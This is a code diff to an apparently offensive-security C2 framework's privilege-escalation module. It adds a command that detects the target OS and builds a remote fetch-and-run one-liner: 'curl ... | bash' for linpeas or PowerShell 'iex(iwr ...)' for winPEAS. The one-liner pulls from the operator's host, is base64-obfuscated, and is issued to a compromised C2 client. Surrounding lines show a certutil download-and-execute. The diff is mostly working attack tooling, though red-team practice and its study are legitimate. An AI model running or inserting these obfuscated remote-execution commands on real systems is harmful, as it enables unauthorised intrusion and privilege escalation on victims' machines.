@@ -15,6 +15,7 @@ deleted from ``lazyown.py``.
 
 from __future__ import annotations
 
+import base64
 import json
 import os
 import shutil
@@ -676,6 +677,121 @@ class PrivilegeEscalationCommandSet(LazyOwnCommandSet):
         print_msg(f'  certutil -urlcache -split -f "http://{lhost}:{lport}/{binary}" %TEMP%\\{binary}')
         print_msg(f"  %TEMP%\\{binary}{args}")
         _serve_via_http(self, binary, sessions_path, lport)
+
+    def _detect_os_for_privesc(self) -> str:
+        """Detect the target OS from world_model.json or sessions/os.json.
+
+        Checks the world model first for the host matching ``rhost``, then
+        falls back to ``sessions/os.json``.
+
+        Returns:
+            ``"linux"``, ``"windows"``, or ``""`` if unknown.
+        """
+        rhost = self.params.get("rhost") or ""
+
+        sessions_path = _sessions_directory(self.path)
+        wm_path = os.path.join(sessions_path, "world_model.json")
+        if rhost and os.path.isfile(wm_path):
+            try:
+                with open(wm_path, encoding="utf-8") as handle:
+                    wm = json.load(handle)
+                hosts = wm.get("hosts", {})
+                host = hosts.get(rhost, {})
+                os_hint = (host.get("os_hint") or "").lower()
+                if os_hint:
+                    if "windows" in os_hint or "win" in os_hint:
+                        return "windows"
+                    if "linux" in os_hint or "unix" in os_hint:
+                        return "linux"
+                    return os_hint
+                for _ip, _h in hosts.items():
+                    _hint = (_h.get("os_hint") or "").lower()
+                    if "windows" in _hint or "win" in _hint:
+                        return "windows"
+                    if "linux" in _hint or "unix" in _hint:
+                        return "linux"
+                    if _hint:
+                        return _hint
+            except (OSError, json.JSONDecodeError):
+                pass
+
+        os_json_path = os.path.join(sessions_path, OS_JSON_FILENAME)
+        if os.path.isfile(os_json_path):
+            try:
+                with open(os_json_path, encoding="utf-8") as handle:
+                    os_data = json.load(handle)
+                if isinstance(os_data, list) and os_data:
+                    os_name = (os_data[0].get("os") or "").lower()
+                    if "linux" in os_name:
+                        return "linux"
+                    if "windows" in os_name:
+                        return "windows"
+                    os_id = str(os_data[0].get("id", ""))
+                    if os_id == "2":
+                        return "linux"
+                    if os_id == "1":
+                        return "windows"
+            except (OSError, json.JSONDecodeError):
+                pass
+
+        return ""
+
+    @cmd2.with_category(privilege_escalation_category)
+    def do_privesc_cmd_by_os(self, line):
+        """Prepare and send a linpeas/winpeas command to a C2 client.
+
+        Detects the target OS from the world model or ``os.json``, builds a
+        ofuscated (base64) curl|bash one-liner via ``ofuscate_payload`` and
+        sends it to the specified C2 client via ``issue_command_to_c2``.
+
+        Args:
+            line: ``<client_id> [--small]``
+
+        Returns:
+            None
+        """
+        parts = (line or "").strip().split()
+        if not parts:
+            print_error("Usage: privesc_cmd_by_os <client_id> [--small]")
+            return
+
+        client_id = parts[0]
+        flags = parts[1:] if len(parts) > 1 else []
+        use_small = "--small" in flags
+
+        platform = self._detect_os_for_privesc()
+        if not platform:
+            print_warn("OS not detected from world_model or os.json. Defaulting to Linux.")
+            platform = "linux"
+
+        print_msg(f"Detected OS: {platform}")
+
+        lhost = self.params.get("lhost") or ""
+        lport = self.params.get("lport", str(DEFAULT_HTTP_LPORT))
+
+        if platform == "linux":
+            fname = LINPEAS_SMALL_FILE_NAME if use_small else LINPEAS_FILE_NAME
+            payload = f"curl -s http://{lhost}:{lport}/{fname} | bash"
+        else:
+            variant = WINPEAS_VARIANTS.get("ps1", "winPEAS.ps1")
+            payload = (
+                f"iex(iwr -Uri 'http://{lhost}:{lport}/{variant}' "
+                f"-UseBasicParsing).Content"
+            )
+
+        b64_payload = base64.b64encode(payload.encode()).decode()
+
+        if platform == "linux":
+            final_cmd = f"echo '{b64_payload}' | base64 -d | bash"
+        else:
+            final_cmd = (
+                f"powershell -c \"[System.Text.Encoding]::UTF8.GetString("
+                f"[System.Convert]::FromBase64String('{b64_payload}')) | iex\""
+            )
+
+        print_msg(f"Issuing privesc command to client {client_id}:")
+        print_msg(f"  {final_cmd[:160]}...")
+        self.issue_command_to_c2(final_cmd, client_id)
 
 
 __all__ = ["PrivilegeEscalationCommandSet"]
